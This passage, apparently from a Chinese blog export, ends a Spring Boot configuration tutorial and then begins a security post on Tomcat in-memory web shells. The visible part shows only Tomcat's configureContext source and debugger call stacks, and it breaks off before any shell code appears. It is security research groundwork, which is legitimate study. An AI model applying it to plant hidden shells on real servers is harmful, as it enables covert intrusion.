<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootinit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.Environment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Environment env;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name&quot;</span> + env.getProperty(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;age&quot;</span> + env.getProperty(<span class="string">&quot;Person.age&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringBoot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>c. @ConfigurationProperties<br>application.yml配置文件同上，新建一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootinit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HelloController中的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootinit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Person person;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello3&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, SpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外在Person类中的上方有一个红色条提示，可以根据提示打开文档<br><a href="https://docs.spring.io/spring-boot/docs/2.3.5.RELEASE/reference/html/appendix-configuration-metadata.html#configuration-metadata-annotation-processor">https://docs.spring.io/spring-boot/docs/2.3.5.RELEASE/reference/html/appendix-configuration-metadata.html#configuration-metadata-annotation-processor</a><br>可以在pom.xml加上下面的依赖，同时保留一个配置文件，这样在编写配置文件的时候能够根据类的属性进行相应的提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>profile配置方式</strong>:<br>在开发SpringBoot应用时，通常一套程序会被安装到不同的生产环境中，比如：开发、测试、生产等。</p>
<ul>
<li>多profile文件方式</li>
<li>yml多文档方式</li>
</ul>
<p>a. 多profile文件方式<br>比如存在多个配置文件：application.properties、application-dev.properties、application-pro.properties、application-test.properties<br>比如在这些文件中分别配置server.port，然后需要在application.properties中进行配置文件激活</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring.profiles.active=pro</span><br></pre></td></tr></table></figure>

<p>这表示的是激活application-pro.properties配置文件，即使用该文件的配置</p>
<p>b. yml多文档方式<br>使用<code>---</code>来分隔配置<br>如下application.yml文档</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">pro</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">test</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">pro</span></span><br></pre></td></tr></table></figure>

<p><strong>profile激活方式</strong>：</p>
<ul>
<li>配置文件<br>配置文件中配置：spring.profiles.active&#x3D;dev (参考上面介绍)</li>
<li>虚拟机参数<br>在VM options指定： -Dspring.profiles.active&#x3D;dev</li>
<li>命令行参数<br>java -jar xx.jar –spring.profiles.active&#x3D;dev</li>
</ul>
<p><strong>内部配置加载顺序</strong>：<br>Springboot在程序启动时，会从以下位置加载配置文件，优先级从高到底</p>
<ul>
<li>.&#x2F;config&#x2F;：当前项目下的&#x2F;config目录下</li>
<li>.&#x2F;：当前项目的根目录</li>
<li>classpath: &#x2F;config&#x2F;   classpath的&#x2F;config目录</li>
<li>classpath: &#x2F;     classpath的根目录</li>
</ul>
<p><strong>外部配置文件加载顺序</strong>：<br><img src="/java-img/20230914115732.png"><br>参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config">https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config</a></p>
]]></content>
      <categories>
        <category>Java基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Tomcat内存马</title>
    <url>/2023/05/19/Tomcat-Memshell/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>以下代码基于Windows 10、Tomcat 9.0.73、JDK 1.8.0_66</p>
<h1 id="Tomcat解析配置文件"><a href="#Tomcat解析配置文件" class="headerlink" title="Tomcat解析配置文件"></a>Tomcat解析配置文件</h1><p>在org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;StandardContext类的startInternal方法开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fireLifecycleEvent(Lifecycle.CONFIGURE_START_EVENT, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>经过如下函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">configureStart:<span class="number">976</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">lifecycleEvent:<span class="number">304</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">fireLifecycleEvent:<span class="number">123</span>, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">startInternal:<span class="number">4851</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:<span class="number">183</span>, LifecycleBase (org.apache.catalina.util)</span><br></pre></td></tr></table></figure>

<p>来到org&#x2F;apache&#x2F;catalina&#x2F;startup&#x2F;ContextConfig类的configureStart方法，其中调用了webConfig方法<br>这个方法合并Tomcat全局web.xml、当前应用的web.xml、web-fragment.xml和web应用中的注解配置信息，然后调用configureContext方法将解析出的各种配置信息（如Servlet配置、Filter配置、Listener配置等）关联到Context对象中<br>configureContext方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">    <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">    <span class="comment">// check everything is present</span></span><br><span class="line">    <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">    <span class="comment">// 设置公共ID</span></span><br><span class="line">    context.setPublicId(webxml.getPublicId());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置版本信息</span></span><br><span class="line">    <span class="comment">// Everything else in order</span></span><br><span class="line">    context.setEffectiveMajorVersion(webxml.getMajorVersion());</span><br><span class="line">    context.setEffectiveMinorVersion(webxml.getMinorVersion());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置上下文参数</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : webxml.getContextParams().entrySet()) &#123;</span><br><span class="line">        context.addParameter(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置其他基本信息</span></span><br><span class="line">    context.setDenyUncoveredHttpMethods(</span><br><span class="line">            webxml.getDenyUncoveredHttpMethods());</span><br><span class="line">    context.setDisplayName(webxml.getDisplayName());</span><br><span class="line">    context.setDistributable(webxml.isDistributable());</span><br><span class="line">    <span class="comment">// 配置EJB引用</span></span><br><span class="line">    <span class="keyword">for</span> (ContextLocalEjb ejbLocalRef : webxml.getEjbLocalRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addLocalEjb(ejbLocalRef);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (ContextEjb ejbRef : webxml.getEjbRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addEjb(ejbRef);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置环境条目</span></span><br><span class="line">    <span class="keyword">for</span> (ContextEnvironment environment : webxml.getEnvEntries().values()) &#123;</span><br><span class="line">        context.getNamingResources().addEnvironment(environment);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置错误页面</span></span><br><span class="line">    <span class="keyword">for</span> (ErrorPage errorPage : webxml.getErrorPages().values()) &#123;</span><br><span class="line">        context.addErrorPage(errorPage);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置过滤器（filter）</span></span><br><span class="line">    <span class="keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (filter.getAsyncSupported() == <span class="literal">null</span>) &#123;</span><br><span class="line">            filter.setAsyncSupported(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        context.addFilterDef(filter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置过滤器映射（filter-mapping）</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;</span><br><span class="line">        context.addFilterMap(filterMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置JSP配置描述符</span></span><br><span class="line">    context.setJspConfigDescriptor(webxml.getJspConfigDescriptor());</span><br><span class="line">    <span class="comment">// 配置监听器</span></span><br><span class="line">    <span class="keyword">for</span> (String listener : webxml.getListeners()) &#123;</span><br><span class="line">        context.addApplicationListener(listener);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置区域编码映射</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">            webxml.getLocaleEncodingMappings().entrySet()) &#123;</span><br><span class="line">        context.addLocaleEncodingMappingParameter(entry.getKey(),</span><br><span class="line">                entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Prevents IAE</span></span><br><span class="line">    <span class="comment">// 设置登录配置</span></span><br><span class="line">    <span class="keyword">if</span> (webxml.getLoginConfig() != <span class="literal">null</span>) &#123;</span><br><span class="line">        context.setLoginConfig(webxml.getLoginConfig());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置消息目标引用</span></span><br><span class="line">    <span class="keyword">for</span> (MessageDestinationRef mdr :</span><br><span class="line">            webxml.getMessageDestinationRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addMessageDestinationRef(mdr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// messageDestinations were ignored in Tomcat 6, so ignore here</span></span><br><span class="line"></span><br><span class="line">    context.setIgnoreAnnotations(webxml.isMetadataComplete());</span><br><span class="line">    <span class="comment">// 配置MIME映射</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">            webxml.getMimeMappings().entrySet()) &#123;</span><br><span class="line">        context.addMimeMapping(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置请求字符编码和响应字符编码</span></span><br><span class="line">    context.setRequestCharacterEncoding(webxml.getRequestCharacterEncoding());</span><br><span class="line">    <span class="comment">// Name is just used for ordering</span></span><br><span class="line">    <span class="comment">// 配置资源环境引用</span></span><br><span class="line">    <span class="keyword">for</span> (ContextResourceEnvRef resource :</span><br><span class="line">            webxml.getResourceEnvRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addResourceEnvRef(resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (ContextResource resource : webxml.getResourceRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addResource(resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置资源引用</span></span><br><span class="line">    context.setResponseCharacterEncoding(webxml.getResponseCharacterEncoding());</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">allAuthenticatedUsersIsAppRole</span> <span class="operator">=</span></span><br><span class="line">            webxml.getSecurityRoles().contains(</span><br><span class="line">                    SecurityConstraint.ROLE_ALL_AUTHENTICATED_USERS);</span><br><span class="line">    <span class="comment">// 配置安全约束</span></span><br><span class="line">    <span class="keyword">for</span> (SecurityConstraint constraint : webxml.getSecurityConstraints()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allAuthenticatedUsersIsAppRole) &#123;</span><br><span class="line">            constraint.treatAllAuthenticatedUsersAsApplicationRole();</span><br><span class="line">        &#125;</span><br><span class="line">        context.addConstraint(constraint);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置安全角色</span></span><br><span class="line">    <span class="keyword">for</span> (String role : webxml.getSecurityRoles()) &#123;</span><br><span class="line">        context.addSecurityRole(role);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置服务引用</span></span><br><span class="line">    <span class="keyword">for</span> (ContextService service : webxml.getServiceRefs().values()) &#123;</span><br><span class="line">        context.getNamingResources().addService(service);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置Servlet</span></span><br><span class="line">    <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">        <span class="comment">// Description is ignored</span></span><br><span class="line">        <span class="comment">// Display name is ignored</span></span><br><span class="line">        <span class="comment">// Icons are ignored</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">        &#125;</span><br><span class="line">        wrapper.setName(servlet.getServletName());</span><br><span class="line">        Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">            wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">        Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">        <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">            wrapper.addSecurityReference(</span><br><span class="line">                    roleRef.getName(), roleRef.getLink());</span><br><span class="line">        &#125;</span><br><span class="line">        wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">        <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">        <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                    multipartdef.getLocation(),</span><br><span class="line">                    maxFileSize,</span><br><span class="line">                    maxRequestSize,</span><br><span class="line">                    fileSizeThreshold));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setAsyncSupported(</span><br><span class="line">                    servlet.getAsyncSupported().booleanValue());</span><br><span class="line">        &#125;</span><br><span class="line">        wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置Servlet映射</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">            webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">        context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置会话配置</span></span><br><span class="line">    <span class="type">SessionConfig</span> <span class="variable">sessionConfig</span> <span class="operator">=</span> webxml.getSessionConfig();</span><br><span class="line">    <span class="keyword">if</span> (sessionConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sessionConfig.getSessionTimeout() != <span class="literal">null</span>) &#123;</span><br><span class="line">            context.setSessionTimeout(</span><br><span class="line">                    sessionConfig.getSessionTimeout().intValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SessionCookieConfig</span> <span class="variable">scc</span> <span class="operator">=</span> context.getServletContext().getSessionCookieConfig();</span><br><span class="line">        scc.setName(sessionConfig.getCookieName());</span><br><span class="line">        scc.setDomain(sessionConfig.getCookieDomain());</span><br><span class="line">        scc.setPath(sessionConfig.getCookiePath());</span><br><span class="line">        scc.setComment(sessionConfig.getCookieComment());</span><br><span class="line">        <span class="keyword">if</span> (sessionConfig.getCookieHttpOnly() != <span class="literal">null</span>) &#123;</span><br><span class="line">            scc.setHttpOnly(sessionConfig.getCookieHttpOnly().booleanValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sessionConfig.getCookieSecure() != <span class="literal">null</span>) &#123;</span><br><span class="line">            scc.setSecure(sessionConfig.getCookieSecure().booleanValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sessionConfig.getCookieMaxAge() != <span class="literal">null</span>) &#123;</span><br><span class="line">            scc.setMaxAge(sessionConfig.getCookieMaxAge().intValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sessionConfig.getSessionTrackingModes().size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            context.getServletContext().setSessionTrackingModes(</span><br><span class="line">                    sessionConfig.getSessionTrackingModes());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Context doesn&#x27;t use version directly</span></span><br><span class="line">    <span class="comment">// 配置欢迎文件</span></span><br><span class="line">    <span class="keyword">for</span> (String welcomeFile : webxml.getWelcomeFiles()) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * The following will result in a welcome file of &quot;&quot; so don&#x27;t add</span></span><br><span class="line"><span class="comment">            * that to the context</span></span><br><span class="line"><span class="comment">            * &lt;welcome-file-list&gt;</span></span><br><span class="line"><span class="comment">            *   &lt;welcome-file/&gt;</span></span><br><span class="line"><span class="comment">            * &lt;/welcome-file-list&gt;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="keyword">if</span> (welcomeFile != <span class="literal">null</span> &amp;&amp; welcomeFile.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            context.addWelcomeFile(welcomeFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do this last as it depends on servlets</span></span><br><span class="line">    <span class="comment">// 配置JSP属性组</span></span><br><span class="line">    <span class="keyword">for</span> (JspPropertyGroup jspPropertyGroup :</span><br><span class="line">            webxml.getJspPropertyGroups()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jspServletName</span> <span class="operator">=</span> context.findServletMapping(<span class="string">&quot;*.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (jspServletName == <span class="literal">null</span>) &#123;</span><br><span class="line">            jspServletName = <span class="string">&quot;jsp&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (context.findChild(jspServletName) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;</span><br><span class="line">                context.addServletMappingDecoded(urlPattern, jspServletName, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Skipping &quot;</span> + urlPattern + <span class="string">&quot; , no servlet &quot;</span> +</span><br><span class="line">                            jspServletName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置PostConstruct方法</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">            webxml.getPostConstructMethods().entrySet()) &#123;</span><br><span class="line">        context.addPostConstructMethod(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 配置PreDestroy方法</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">        webxml.getPreDestroyMethods().entrySet()) &#123;</span><br><span class="line">        context.addPreDestroyMethod(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">configureContext:<span class="number">1447</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">webConfig:<span class="number">1330</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">configureStart:<span class="number">987</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">lifecycleEvent:<span class="number">304</span>, ContextConfig (org.apache.catalina.startup)</span><br><span class="line">fireLifecycleEvent:<span class="number">123</span>, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">startInternal:<span class="number">4851</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:<span class="number">183</span>, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">addChildInternal:<span class="number">683</span>, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:<span class="number">658</span>, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:<span class="number">662</span>, StandardHost (org.apache.catalina.core)</span><br><span class="line">manageApp:<span class="number">1782</span>, HostConfig (org.apache.catalina.startup)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invoke:<span class="number">294</span>, BaseModelMBean (org.apache.tomcat.util.modeler)</span><br><span class="line">invoke:<span class="number">819</span>, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)</span><br><span class="line">invoke:<span class="number">801</span>, JmxMBeanServer (com.sun.jmx.mbeanserver)</span><br><span class="line">createStandardContext:<span class="number">460</span>, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">createStandardContext:<span class="number">408</span>, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invoke:<span class="number">294</span>, BaseModelMBean (org.apache.tomcat.util.modeler)</span><br><span class="line">invoke:<span class="number">819</span>, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)</span><br><span class="line">invoke:<span class="number">801</span>, JmxMBeanServer (com.sun.jmx.mbeanserver)</span><br><span class="line">invoke:<span class="number">468</span>, MBeanServerAccessController (com.sun.jmx.remote.security)</span><br><span class="line">doOperation:<span class="number">1471</span>, RMIConnectionImpl (javax.management.remote.rmi)</span><br><span class="line">access$<span class="number">300</span>:<span class="number">76</span>, RMIConnectionImpl (javax.management.remote.rmi)</span><br><span class="line">run:<span class="number">1312</span>, RMIConnectionImpl$PrivilegedOperation (javax.management.remote.rmi)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span 